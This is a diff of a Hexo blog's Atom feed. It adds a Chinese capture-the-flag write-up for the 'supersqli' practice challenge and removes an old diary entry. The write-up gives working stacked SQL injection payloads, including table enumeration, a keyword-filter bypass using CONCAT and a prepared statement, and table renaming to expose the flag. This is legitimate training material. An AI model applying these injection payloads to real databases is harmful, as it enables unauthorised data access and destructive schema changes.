@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2022-12-10T18:16:49.592Z</updated>
+  <updated>2022-12-11T05:36:51.974Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,33 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>CTF_sql_1</title>
+    <link href="http://example.com/2022/12/11/CTF_sql_1/"/>
+    <id>http://example.com/2022/12/11/CTF_sql_1/</id>
+    <published>2022-12-10T16:00:00.000Z</published>
+    <updated>2022-12-11T05:36:51.974Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第一次做的CTF题目，虽然简单，但由于我已经很久没碰SQL注入的东西了，忘得七七八八，导致做不出来。</p><span id="more"></span><h1 id="题目来源"><a href="#题目来源" class="headerlink" title="题目来源"></a>题目来源</h1><p>攻防世界 -&gt; supersqli</p><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol><li><p>初步尝试<br><code>1&#39;</code> 出现了报错，并且根据报错信息可知，就是使用1’注入<br><code>1&#39; order by 2#</code> 可知列数为2<br><code>1&#39; union select 1,2 #</code> 发现遇到一个报错：<br><code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code><br>尝试大小写，双写，注释符，内联等绕过方式后均无果，于是考虑别的办法</p></li><li><p>堆叠注入<br>在多次尝试后，选择堆叠注入。<br><code>1&#39;;show databases; --+</code><br>成功显示数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show tables; --+</span><br><span class="line"></span><br><span class="line">成功显示表名：</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(16) &quot;1919810931114514&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(5) &quot;words&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对每个表名查询字段，查询字段时需要将表名用反引号（`）括起来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show columns from `1919810931114514`; --+</span><br><span class="line"></span><br><span class="line">字段如下：</span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;flag&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(12) &quot;varchar(100)&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show columns from `words`; --+</span><br><span class="line"></span><br><span class="line">字段如下：</span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(2) &quot;id&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;int(10)&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;data&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(11) &quot;varchar(20)&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从上面查询可知，我们所需的flag在表名为“1919810931114514”当中。<br>接下来就是如何获取到该字段</p></li><li><p>获取flag</p></li></ol><ul><li><p>方法1：预编译<br><a href="https://www.cnblogs.com/geaozhang/p/9891338.html">预编译的知识</a><br>简单来说有三步：<br>set @xxx &#x3D; 需要查询的语句;<br>prepare stmt from @xxx;<br>execute stmt;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;sEt @sql = CONCAT(&#x27;se&#x27;,&#x27;lect * from `1919810931114514`;&#x27;);prEpare stmt from @sql;EXECUTE stmt;#</span><br></pre></td></tr></table></figure><p>即可获得flag</p></li><li><p>方法2：改表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;rename tables `words` to `words1`;rename tables `1919810931114514` to `words`; alter table `words` change `flag` `id` varchar(100);#</span><br></pre></td></tr></table></figure><p>改好后再通过这个语句查询：<br><code>1&#39; or 1=1 #</code><br>即可获得flag</p></li></ul><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>好好学习，天天向上</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Mr_helloword/article/details/107935479">攻防世界-supersqli详解</a></p>]]></content>
+    
+    
+    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;第一次做的CTF题目，虽然简单，但由于我已经很久没碰SQL注入的东西了，忘得七七八八，导致做不出来。&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
+    
+    <category term="SQL注入" scheme="http://example.com/categories/CTF/SQL%E6%B3%A8%E5%85%A5/"/>
+    
+    
+    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
+    
+    <category term="SQL注入" scheme="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
+    
+    <category term="堆叠注入" scheme="http://example.com/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
   
   <entry>
     <title>不知老之将至</title>
@@ -438,29 +465,6 @@
     <category term="upload-labs" scheme="http://example.com/tags/upload-labs/"/>
     
     <category term="蚁剑" scheme="http://example.com/tags/%E8%9A%81%E5%89%91/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>是非成败转头空</title>
-    <link href="http://example.com/2022/11/24/Diary_1124/"/>
-    <id>http://example.com/2022/11/24/Diary_1124/</id>
-    <published>2022-11-23T16:00:00.000Z</published>
-    <updated>2022-11-24T18:06:48.367Z</updated>
-    
-    <content type="html"><![CDATA[<p><img src="/images/%E9%9D%A2%E7%A0%81122.jpg" alt="本间芽衣子"></p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>不知不觉过去了一天…</p><h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>You smiled and talked to me of nothing and I felt that for this I had been waiting long.<br>你微笑地看着我，不说一句话。而我知道，为了这个，我已经等待很久了。</p><h1 id="时间的认知"><a href="#时间的认知" class="headerlink" title="时间的认知"></a>时间的认知</h1><p>零点过的时候，骤然看了下日期，发现周五，以为明日是周末了。一种快乐从我心底迸发，是惊讶的喜悦。可我过了会儿发现，日期是零点过后看的，周五才刚刚开始。我就像走入了周五的循环，第一次认识的时候，它是<strong>末尾</strong>。第二次认识的时候，它是<strong>开始</strong>。下一次认识，恐怕又是<strong>末尾</strong>了吧。<br>好像有什么变了，好像什么都没变。变的是我的认知，不变的是世界的规律。</p><h1 id="一天"><a href="#一天" class="headerlink" title="一天"></a>一天</h1><p>突然想到了穆勒的《功利主义》，好久没读了。这里提醒自己一下，有时间去读。这本书的一些重要思想：</p><ul><li>高级快乐和低级快乐，快乐有质的不同</li><li>调和美德与幸福的冲突，美德也是一种幸福</li><li>正义需要感性的力量，有别于利益</li></ul><p>早上本可吃早餐然后完成“检测”，但我不知道哪根筋抽了，居然在等无谓的人，浪费了足足半小时有余，甚至因此在十一点前就吃了午餐，实在糟糕。然而，因等了人，才知道有另外的渠道查看“码”。让我不禁想到了一句话：一个人能走得更快，一群人能走得更远。<br>所以，我的选择是御风而行，不浪费生命。<br>晚上听听力真糟糕，吵闹混乱使人效率变得低下，早点起听听力，学英语！</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>不敢相信，这篇短短日记写了半小时，又睡晚了可恶啊！</p>]]></content>
-    
-    
-    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/%E9%9D%A2%E7%A0%81122.jpg&quot; alt=&quot;本间芽衣子&quot;&gt;&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
-    
-    
-    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
-    
-    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
     
   </entry>
   
